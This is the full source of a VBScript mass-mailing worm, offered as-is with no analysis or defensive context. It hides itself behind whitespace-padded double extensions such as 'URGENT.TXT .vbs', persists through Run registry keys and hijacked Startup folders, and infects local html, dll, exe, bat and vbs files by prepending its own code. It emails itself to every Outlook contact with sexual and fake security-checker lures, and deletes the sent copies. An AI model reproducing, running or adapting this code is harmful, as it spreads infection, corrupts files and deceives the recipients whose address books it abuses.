'Created in Europe, just for fun

Dim fso, sh, c, file

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set c = fso.GetFile(WScript.ScriptFullName)

Set file = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), ("URGENT.TXT                 .vbs")), True)
		Set x = fso.OpenTextFile(WScript.ScriptFullName,1)
		codecopy = x.ReadAll
		file.Write codecopy
		file.Close

sh.RegWrite "HKEY_CLASSES_ROOT\.bll\", "VBSFile"
sh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup", "c:\startup"
sh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup", "c:\startup"
sh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer\User Shell Folders\Common Startup", "c:\startup"
sh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders\Common Startup", "c:\startup"
sh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Start", fso.BuildPath( fso.GetSpecialFolder(0), "URGENT.TXT                 .vbs")
sh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Start", fso.BuildPath( fso.GetSpecialFolder(0), "URGENT.TXT                 .vbs")

testfile()
Function testfile()
Dim fold
main = "c:\startup"

If Not fso.FolderExists("c:\startup") Then
Set fold = fso.CreateFolder(main)
End If

f1 = "\startup.bll"
f2 = "\start.bll"
f3 = "\winstart.bll"
f4 = "\autoexec.bat.bll"
f5 = "\win.ini.bll"
f6 = "\config.bll"
f7 = "\windoh.bll"
f8 = "\fooled.bll"
f9 = "\gotcha                .fooled.bll"
f10 = "\nothing.bll"

Randomize
num = Int((10*Rnd)+1)

If num = 1 Then
 If Not fso.FileExists(main & f1) Then
c.Copy(main & f1)
 End If

Elseif num = 2 Then
 If Not fso.FileExists(main & f2) Then
c.Copy(main & f2)
 End If

Elseif num = 3 Then
 If Not fso.FileExists(main & f3) Then
c.Copy(main & f3)
 End If

Elseif num = 4 Then
 If Not fso.FileExists(main & f4) Then
c.Copy(main & f4)
 End If

Elseif num = 5 Then
 If Not fso.FileExists(main & f5) Then
c.Copy(main & f5)
 End If

Elseif num = 6 Then
 If Not fso.FileExists(main & f6) Then
c.Copy(main & f6)
 End If

Elseif num = 7 Then
 If Not fso.FileExists(main & f7) Then
c.Copy(main & f7)
 End If

Elseif num = 8 Then
 If Not fso.FileExists(main & f8) Then
c.Copy(main & f8)
 End If

Elseif num = 9 Then
 If Not fso.FileExists(main & f9) Then
c.Copy(main & f9)
 End If

Elseif num = 10 Then
 If Not fso.FileExists(main & f10) Then
c.Copy(main & f10)
 End If
End If
End Function


prepend()

Function prepend()
Set OpenSelf = fso.OpenTextFile(Wscript.ScriptFullName, 1, True)
Self = OpenSelf.Read(7200)
Set CurrentDirectory = fso.GetFolder(".")
For Each ScriptFiles in CurrentDirectory.Files
ExtName = Lcase(fso.GetExtensionName(ScriptFiles.path))
If ExtName = "html" or ExtName = "hta" or ExtName = "ocx" or ExtName = "dll" or ExtName = "bat" or ExtName = "exe" or ExtName = "vbs" or ExtName = "vbe" Then
Set Scripts = fso.OpenTextFile(ScriptFiles.path, 1, True)
If Scripts.ReadLine <> "'Created in Europe, just for fun" then
Set Scripts = Nothing
Set Scripts = fso.OpenTextFile(ScriptFiles.path, 1, True)
ScriptsSource = Scripts.ReadAll
Set WriteScripts = fso.OpenTextFile(ScriptFiles.path, 2, True)
WriteScripts.WriteLine Self
WriteScripts.WriteLine ScriptsSource
WriteScripts.Close
End If
End If
Next
End Function

sending()
Function sending()
On Error Resume Next
win = fso.GetSpecialFolder(0)
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
 Set azer=Outlook.GetNameSpace("MAPI")
 Set reza=azer.AddressLists
 For Each ListIndex In reza
  If ListIndex.AddressEntries.Count <> 0 Then
   ContactCount = ListIndex.AddressEntries.Count
   For Count= 1 To ContactCount
    Set qwert = Outlook.CreateItem(0)
    Set tes = ListIndex.AddressEntries(Count)
    qwert.To = tes.Address
    Set Attachment=qwert.Attachments
    
    Randomize
				num = Int((3*Rnd)+1)
			
			a1 = "Something very special"
			a2 = "I know you will like this"
			a3 = "Yes, something I can share with you"
			a4 = "Wait till you see this!"
			a5 = "Check out this picture of me masturbating"
			
			b1 = "Hey you, take a look at the attached file.  You won't believe your eyes when you open it!"
			b2 = "Run this vulnerable script checker to see if your system is vulnerable to malicious scripts."
			b3 = "Did you see the pictures of me and my battery operated boyfriend?"
			b4 = "My best friend," & VbCrlf & VbCrlf & "This is something you have to see!" & VbCrlf & VbCrlf &"Till next time"
			b5 = "Is the Internet that safe?" & VbCrlf & VbCrlf & "Check it out"
			
	If num = 1 then
		c.Copy(win &"\Readme.TXT  .vbs")
	
	Randomize
	tel = Int((5*Rnd)+1)
		
		If tel = 1 Then
		qwert.Subject = a1
		Elseif tel = 2 Then
		qwert.Subject = a2
		Elseif tel = 3 Then
		qwert.Subject = a3
		Elseif tel = 4 Then
		qwert.Subject = a4
		Elseif tel = 5 Then
		qwert.Subject = a5
		End If
		
	Randomize
	tell = Int((5*Rnd)+1)
	
		If tell = 1 Then
		qwert.Body = b1
		Elseif tell = 2 Then
		qwert.Body = b2
		Elseif tell = 3 Then
		qwert.Body = b3
		Elseif tell = 4 Then
		qwert.Body = b4
		Elseif tell = 5 Then
		qwert.Body = b5
		End If
		Attachment.Add fso.BuildPath(win,"Readme.TXT  .vbs")
		
	elseif num = 2 then
		c.Copy(win &"\SECURE.JPG   .vbs")
	Randomize
	tel = Int((5*Rnd)+1)
		
		If tel = 1 Then
		qwert.Subject = a1
		Elseif tel = 2 Then
		qwert.Subject = a2
		Elseif tel = 3 Then
		qwert.Subject = a3
		Elseif tel = 4 Then
		qwert.Subject = a4
		Elseif tel = 5 Then
		qwert.Subject = a5
		End If
		
	Randomize
	tell = Int((5*Rnd)+1)
	
		If tell = 1 Then
		qwert.Body = b1
		Elseif tell = 2 Then
		qwert.Body = b2
		Elseif tell = 3 Then
		qwert.Body = b3
		Elseif tell = 4 Then
		qwert.Body = b4
		Elseif tell = 5 Then
		qwert.Body = b5
		End If
		Attachment.Add fso.BuildPath(win ,"SECURE.JPG   .vbs")

	elseif num = 3 then
		c.Copy(win &"\MyDildo.jpg   .vbs")
	Randomize
	tel = Int((5*Rnd)+1)
		
		If tel = 1 Then
		qwert.Subject = a1
		Elseif tel = 2 Then
		qwert.Subject = a2
		Elseif tel = 3 Then
		qwert.Subject = a3
		Elseif tel = 4 Then
		qwert.Subject = a4
		Elseif tel = 5 Then
		qwert.Subject = a5
		End If
		
	Randomize
	tell = Int((5*Rnd)+1)
	
		If tell = 1 Then
		qwert.Body = b1
		Elseif tell = 2 Then
		qwert.Body = b2
		Elseif tell = 3 Then
		qwert.Body = b3
		Elseif tell = 4 Then
		qwert.Body = b4
		Elseif tell = 5 Then
		qwert.Body = b5
		End If
		Attachment.Add fso.BuildPath(win ,"MyDildo.jpg   .vbs")
		End If
    qwert.DeleteAfterSubmit = True
    If qwert.To <> "" Then
    qwert.Send
   End If
   Next
  End If
 Next
End if
End Function


annoy()
Sub annoy()
mun = 0
Do
sh.Run ("notepad.exe")
mun = mun + 1
Loop Until mun = 10
End Sub









